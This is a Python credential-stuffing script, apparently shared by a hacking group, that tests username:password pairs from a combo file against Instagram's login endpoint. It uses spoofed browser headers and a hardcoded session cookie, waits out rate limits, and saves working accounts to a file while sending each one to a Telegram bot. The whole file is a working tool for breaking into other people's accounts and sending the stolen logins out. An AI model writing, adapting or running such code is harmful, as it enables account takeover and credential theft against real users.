
import requests
import random
import time
import os


hunt = 0
bad = 0

logo = '''
\033[1;96m

d888888b db      db    db  .d8b.  db   dD 
`~~88~~' 88      `8b  d8' d8' `8b 88 ,8P' 
   88    88       `8bd8'  88ooo88 88,8P   
   88    88         88    88~~~88 88`8b   
   88    88booo.    88    88   88 88 `88. 
   YP    Y88888P    YP    YP   YP YP   YD 
                                          
                                          

----------------------------------------------
\033[37;1mAuther   : lililliilliil
\033[1;92m Code By TLYAK
\033[37;1mTelegram : Team_cod3r_1
----------------------------------------------
'''

xoshnaw = input('1 : ')


if xoshnaw == '1':
	    print(logo)
	    print('-'*60)
	    print('-'*60)
	    idd = input('\033[32mID TELEGRAM:')
	    token =input('\033[32mTOKEN BOT:')
	    os.system('clear')
	    print (logo)
	    combo =input('\033[32mFILE COMBO:')
	    print('-'*60)
	    try:
	    	x0shnaw = open(combo, 'r')
	    except:
	    	print()
	    	print('GHALATA !')
	    	exit(0)
	    while True:
	        gu=x0shnaw.readline().split('\n')[0]
	        username = gu.split(':')[0]
	        passw=gu.split(':')[1]
	        h = {
	            "accept": "*/*",
	            "accept-encoding": "gzip, deflate, br",
	            "accept-language": "en-US,en;q=0.9",
	            "content-length": "263",
	            "content-type": "application/x-www-form-urlencoded",
	            "cookie": "ig_did=7BDD6638-B2A5-474C-99F9-1B82DFB3739B; csrftoken=iuecb4MRIXlHptWwbrTLXnHA4dAew4HZ; mid=YFX-GAALAAH1ihcw8fZKrmsn01eZ; ig_nrcb=1",
	            "origin": "https://www.instagram.com",
	            "referer": "https://www.instagram.com/",
	            'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
	            "sec-ch-ua-mobile": "?0",
	            "sec-fetch-dest": "empty",
	            "sec-fetch-mode": "cors",
	            "sec-fetch-site": "same-origin",
	            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
	            "x-csrftoken": "iuecb4MRIXlHptWwbrTLXnHA4dAew4HZ",
	            "x-ig-app-id": "936619743392459",
	            "x-ig-www-claim": "0",
	            "x-instagram-ajax": "6e88beeacb46",
	            "x-requested-with": "XMLHttpRequest"
	        }
	        def log():         
	            urllogin = ("https://www.instagram.com/accounts/login/ajax/")
	            data = {
	                'username': username,
	                'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:' + passw
	            }
	            r = requests.post(urllogin, data=data, headers=h).text
	            time.sleep(2) 
	            tt=time.asctime()
	            if ('"authenticated":true') in r:
	                tlg =requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={idd}&text=HI Inistagram Cracked \nUSERNAME: {username}\nPASSWORD: {passw}\n')
	                print (f'\033[32mVery-GOOD: {username}:{passw}')
	                with open('GOOD.txt', 'a') as x:
	                    x.write(username +':'+passw +"\n")
	            elif ('"authenticated":false') in r:
	                print (f'\033[1;91mBAD: {username}:{passw}')
	            elif ('"Please wait a few minutes before you try again."') in r:
	                print ("TKAIA MAWAYAK BWASTA XOY DAS PE AKAT")
	                time.sleep(500)
	            elif ("To secure your account, we've reset your password. Click ") in r:
	                tlg =requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={idd}&text=HI Inistagram Cracked\nUSERNAME: {username}\nPASSWORD: {passw}\n')
	                print (f'GOOD: {username}:{passw}')
	            else:
	               print (f'BAD: {username}:{passw}')
	        log()


